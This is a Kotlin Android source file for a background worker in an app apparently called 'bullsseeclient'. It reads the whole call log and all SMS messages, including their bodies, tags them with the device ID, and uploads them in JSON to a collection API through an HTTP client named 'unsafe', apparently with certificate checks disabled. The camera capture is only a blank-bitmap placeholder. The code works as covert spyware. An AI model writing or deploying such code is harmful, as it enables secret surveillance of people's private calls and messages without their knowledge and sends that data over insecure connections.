package com.example.bullsseeclient

import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.provider.CallLog
import android.provider.Telephony
import android.telephony.TelephonyManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.POST
import java.time.Instant
import java.util.UUID
import java.io.ByteArrayOutputStream

class DataCollectionWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    private val deviceName: String by lazy {
        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            UUID.randomUUID().toString()
        } else {
            @Suppress("DEPRECATION")
            telephonyManager.deviceId ?: UUID.randomUUID().toString()
        }
    }

    override fun doWork(): Result {
        try {
            val data = DeviceDataDtos()

            // Collect call logs
            val callLogs = mutableListOf<CallLogData>()
            val callCursor = applicationContext.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                null
            )
            callCursor?.use { cursor ->
                while (cursor.moveToNext()) {
                    val number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    val date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    callLogs.add(CallLogData(deviceName, number, Instant.ofEpochMilli(date).toString()))
                }
            }
            data.callLogs = callLogs

            // Collect SMS logs
            val smsLogs = mutableListOf<SmsLogData>()
            val smsCursor = applicationContext.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null,
                null,
                null,
                null
            )
            smsCursor?.use { cursor ->
                while (cursor.moveToNext()) {
                    val address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                    val body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY))
                    val date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE))
                    smsLogs.add(SmsLogData(deviceName, address, body, Instant.ofEpochMilli(date).toString()))
                }
            }
            data.smsLogs = smsLogs

            // Capture camera image (simplified, placeholder)
            val cameraImage = captureCameraImage()
            if (cameraImage != null) {
                data.cameraImages = listOf(cameraImage)
            }

            // Send data to API
            if (data.callLogs?.isNotEmpty() == true) sendCallLogsToApi(data)
            if (data.smsLogs?.isNotEmpty() == true) sendSmsLogsToApi(data)
            if (data.cameraImages?.isNotEmpty() == true) sendCameraImageToApi(data)

            return Result.success()
        } catch (e: Exception) {
            return Result.failure()
        }
    }

    private fun captureCameraImage(): CameraImageData? {
        val currentTime = Instant.now() // 06:43 PM IST, 2025-09-03
        val bitmap = Bitmap.createBitmap(100, 100, Bitmap.Config.ARGB_8888)
        val stream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)
        val base64Image = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.DEFAULT)
        return CameraImageData(deviceName, base64Image, currentTime.toString())
    }

    private fun sendCallLogsToApi(data: DeviceDataDtos) {
        val retrofit = Retrofit.Builder()
            .baseUrl("https://localhost:7239/")
            .addConverterFactory(GsonConverterFactory.create())
            .client(HttpClient.getUnsafeOkHttpClient())
            .build()

        val apiService = retrofit.create(ApiService::class.java)
        val body = RequestBody.create("application/json".toMediaType(), Gson().toJson(data))
        apiService.uploadCallLogs(body).enqueue(object : retrofit2.Callback<Void> {
            override fun onResponse(call: Call<Void>, response: retrofit2.Response<Void>) {
                if (!response.isSuccessful) {
                    // Log failure
                }
            }
            override fun onFailure(call: Call<Void>, t: Throwable) {
                // Handle failure
            }
        })
    }

    private fun sendSmsLogsToApi(data: DeviceDataDtos) {
        val retrofit = Retrofit.Builder()
            .baseUrl("https://localhost:7239/")
            .addConverterFactory(GsonConverterFactory.create())
            .client(HttpClient.getUnsafeOkHttpClient())
            .build()

        val apiService = retrofit.create(ApiService::class.java)
        val body = RequestBody.create("application/json".toMediaType(), Gson().toJson(data))
        apiService.uploadSmsLogs(body).enqueue(object : retrofit2.Callback<Void> {
            override fun onResponse(call: Call<Void>, response: retrofit2.Response<Void>) {
                if (!response.isSuccessful) {
                    // Log failure
                }
            }
            override fun onFailure(call: Call<Void>, t: Throwable) {
                // Handle failure
            }
        })
    }

    private fun sendCameraImageToApi(data: DeviceDataDtos) {
        val retrofit = Retrofit.Builder()
            .baseUrl("https://localhost:7239/")
            .addConverterFactory(GsonConverterFactory.create())
            .client(HttpClient.getUnsafeOkHttpClient())
            .build()

        val apiService = retrofit.create(ApiService::class.java)
        val body = RequestBody.create("application/json".toMediaType(), Gson().toJson(data))
        apiService.uploadCameraImage(body).enqueue(object : retrofit2.Callback<Void> {
            override fun onResponse(call: Call<Void>, response: retrofit2.Response<Void>) {
                if (!response.isSuccessful) {
                    // Log failure
                }
            }
            override fun onFailure(call: Call<Void>, t: Throwable) {
                // Handle failure
            }
        })
    }

    data class DeviceDataDtos(
        var callLogs: List<CallLogData>? = null,
        var smsLogs: List<SmsLogData>? = null,
        var cameraImages: List<CameraImageData>? = null
    )

    data class CallLogData(val deviceName: String, val number: String, val date: String)
    data class SmsLogData(val deviceName: String, val address: String, val body: String, val date: String)
    data class CameraImageData(val deviceName: String, val base64Image: String, val timestamp: String)

    interface ApiService {
        @POST("api/DeviceData/calllog")
        fun uploadCallLogs(@Body data: RequestBody): Call<Void>

        @POST("api/DeviceData/smslog")
        fun uploadSmsLogs(@Body data: RequestBody): Call<Void>

        @POST("api/DeviceData/cameraImage")
        fun uploadCameraImage(@Body data: RequestBody): Call<Void>
    }
}